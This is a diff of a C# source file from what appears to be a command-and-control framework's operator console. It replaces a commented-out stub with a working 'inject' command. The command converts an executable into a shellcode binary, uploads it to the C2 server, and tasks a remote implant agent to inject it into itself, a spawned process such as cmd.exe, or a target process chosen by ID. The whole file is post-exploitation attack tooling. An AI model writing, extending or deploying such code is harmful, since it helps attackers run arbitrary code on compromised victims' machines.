@@ -1,156 +1,125 @@
-﻿//using ApiModels.Response;
-//using Commander.Commands;
-//using Commander.Communication;
-//using Commander.Executor;
-//using Commander.Terminal;
-//using System;
-//using System.Collections.Generic;
-//using System.IO;
-//using System.Linq;
-//using System.Text;
-//using System.Threading.Tasks;
+﻿using ApiModels.Response;
+using Commander.Commands;
+using Commander.Communication;
+using Commander.Executor;
+using Commander.Terminal;
+using System;
+using System.Collections.Generic;
+using System.CommandLine;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
 
-//namespace Commander
-//{
-
-//    public abstract class InjectCommand : ExecutorCommand
-//    {
-//        public const int ChunkSize = 10000;
-
-//        public const string RootFolder = "/Share/tmp/C2/Commander/Module";
-//        public const string TmpFolder = "/Share/tmp/C2/Commander/Tmp";
-//        public const string ServerFolder = "Tmp/";
-
-//        public abstract string ExeName { get; }
-
-//        public virtual string ProcessName { get; set; } = "cmd.exe";
-
-//        public virtual string ComputeParams(string innerParams)
-//        {
-//            return innerParams;
-//        }
-
-//        protected override void InnerExecute(string label, ITerminal terminal, IExecutor executor, ICommModule comm, string parms)
-//        {
-            
-//            terminal.WriteLine($"Generating payload with params {parms}...");
-//            terminal.WriteLine(this.GenerateBin(this.ExeName, this.ComputeParams(parms), out var binFileName));
+namespace Commander
+{
+    public class InjectCommandOptions
+    {
+        public string injectionType { get; set; }
+        public string fileToInject { get; set; }
+        public string parameters { get; set; }
+        public string processName { get; set; }
+        public int? processId { get; set; }
+        public bool verbose { get; set; }
+    }
 
 
-//            terminal.WriteLine($"Pushing {binFileName} to the server...");
-//            //var binFileName = "e:\\Share\\tmp\\C2\\Custom\\b18a05ad-b7df-4fcf-b529-d6faa582ed13.bin";
-//            string serverFile = ServerFolder + "/" + Path.GetFileName(binFileName);
-//            terminal.WriteLine($"ServerFile = {serverFile}...");
-//            if (!this.PushFile(binFileName, serverFile, terminal, executor, comm).Result)
-//                terminal.WriteError("An error occured while uploading the file to the server");
-
-//            File.Delete(binFileName);
-
-//            var agent = executor.CurrentAgent;
-//            var response = comm.TaskAgent(label, Guid.NewGuid().ToString(), agent.Metadata.Id, "inject-spawn", $"{serverFile} {this.ProcessName}").Result;
-//            if (!response.IsSuccessStatusCode)
-//            {
-//                terminal.WriteError("An error occured : " + response.StatusCode);
-//                return;
-//            }
-
-//            terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
-
-//        }
 
 
-//        protected string GetRandomName()
-//        {
-//            return Guid.NewGuid().ToString();
-//        }
-//        protected string GenerateBin(string exename, string parameters, out string binPath)
-//        {
-//            string inputPath = Path.Combine(RootFolder, exename);
-//            var name = Path.Combine(TmpFolder, GetRandomName() + ".bin");
-//            string ret = Internal.BinMaker.GenerateBin(inputPath, name, parameters);
-//            binPath = name;
-//            return ret;
-//        }
 
-//        protected async Task<bool> PushFile(string fileName, string remoteName, ITerminal terminal, IExecutor executor, ICommModule comm)
-//        {
-//            var path = fileName;
-//            if (!File.Exists(path))
-//            {
-//                terminal.WriteError($"File {path} does not exists!");
-//                return false;
-//            }
+    public class InjectCommand : EnhancedCommand<InjectCommandOptions>
+    {
+
+        public static string TmpFolder { get; set; } = "/Share/tmp/C2/Commander/Tmp";
+        public static string ModuleFolder { get; set; } = "/Share/tmp/C2/Commander/Module";
+
+        public override string Name => "inject";
+        public override string Category => CommandCategory.Core;
+
+        public override string Description => "Inject an executable";
+
+        public virtual string ComputeParams(string innerParams)
+        {
+            return innerParams;
+        }
+
+        public override RootCommand Command => new RootCommand(this.Description)
+        {
+            new Argument<string>("injectionType", "Type of injection").FromAmong("self", "spawn", "remote"),
+            new Argument<string>("fileToInject", "path of the file to inject"),
+            new Argument<string>("parameters", () => string.Empty, "parameters to use"),
+            new Option<string>(new[] { "--processName", "-p" }, () => "cmd.exe" ,"process name to start."),
+            new Option<int?>(new[] { "--processId", "-i" }, "process id to inject to."),
+            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
+        };
+
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+
+        protected override async Task<bool> HandleCommand(CommandContext<InjectCommandOptions> context)
+        {
+            context.Terminal.WriteLine($"Generating payload with params {context.CommandParameters}...");
+
+            var result = GenerateBin(context.Options.fileToInject, this.ComputeParams(context.Options.parameters), out var binFileName);
+            if (context.Options.verbose)
+                context.Terminal.WriteLine(result);
+
+            context.Terminal.WriteLine($"Pushing {binFileName} to the server...");
+
+            byte[] fileBytes = null;
+            using (FileStream fs = File.OpenRead(binFileName))
+            {
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
+            }
+
+            bool first = true;
+            var fileId = await context.CommModule.Upload(fileBytes, binFileName, a =>
+            {
+                context.Terminal.ShowProgress("uploading", a, first);
+                first = false;
+            });
+
+            File.Delete(binFileName);
+            string fileName = Path.GetFileName(binFileName);
+
+            if(context.Options.injectionType.Equals("spawn"))
+            {
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");
+            }
+            else if(context.Options.injectionType == "remote")
+            {
+                if(!context.Options.processId.HasValue)
+                {
+                    context.Terminal.WriteError("A processId is required.");
+                    return false;
+                }
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId}");
+            }
+            else //self
+            {
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-self", fileId, fileName);
+            }
+
+            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
+            return true;
+        }
 
 
-//            byte[] fileBytes = null;
-//            using (FileStream fs = File.OpenRead(path))
-//            {
-//                fileBytes = new byte[fs.Length];
-//                fs.Read(fileBytes, 0, (int)fs.Length);
-//            }
+        public static string GetRandomName()
+        {
+            return Guid.NewGuid().ToString();
+        }
+
+        public static string GenerateBin(string inputPath, string parameters, out string binPath)
+        {
+            var name = Path.Combine(TmpFolder, GetRandomName() + ".bin");
+            string ret = Internal.BinMaker.GenerateBin(inputPath, name, parameters);
+            binPath = name;
+            return ret;
+        }
 
 
-//            var desc = new FileDescriptorResponse()
-//            {
-//                Length = fileBytes.Length,
-//                ChunkSize = ChunkSize,
-//                Id = Guid.NewGuid().ToString(),
-//                Name = remoteName
-//            };
+    }
 
-//            var chunks = new List<FileChunckResponse>();
-
-//            int index = 0;
-//            using (var ms = new MemoryStream(fileBytes))
-//            {
-
-//                var buffer = new byte[ChunkSize];
-//                int numBytesToRead = (int)ms.Length;
-
-//                while (numBytesToRead > 0)
-//                {
-
-//                    int n = ms.Read(buffer, 0, ChunkSize);
-//                    //var data =
-//                    var chunk = new FileChunckResponse()
-//                    {
-//                        FileId = desc.Id,
-//                        Data = System.Convert.ToBase64String(buffer.Take(n).ToArray()),
-//                        Index = index,
-//                    };
-//                    chunks.Add(chunk);
-//                    numBytesToRead -= n;
-
-//                    index++;
-//                }
-//            }
-
-//            desc.ChunkCount = chunks.Count;
-
-//            var result = await comm.PushFileDescriptor(desc);
-//            if (!result.IsSuccessStatusCode)
-//            {
-//                var cont = await result.Content.ReadAsStringAsync();
-//                terminal.WriteError($"An error occured : {result.StatusCode} - {cont}");
-//                return false;
-//            }
-
-//            index = 0;
-//            foreach (var chunk in chunks)
-//            {
-//                result = await comm.PushFileChunk(chunk);
-//                if (!result.IsSuccessStatusCode)
-//                {
-//                    var cont = await result.Content.ReadAsStringAsync();
-//                    terminal.WriteError($"An error occured : {result.StatusCode} - {cont}");
-//                    return false;
-//                }
-//                index++;
-//            }
-
-//            terminal.WriteInfo($"File uploaded to {remoteName}.");
-
-//            return true;
-//        }
-//    }
-//}
+    
+}
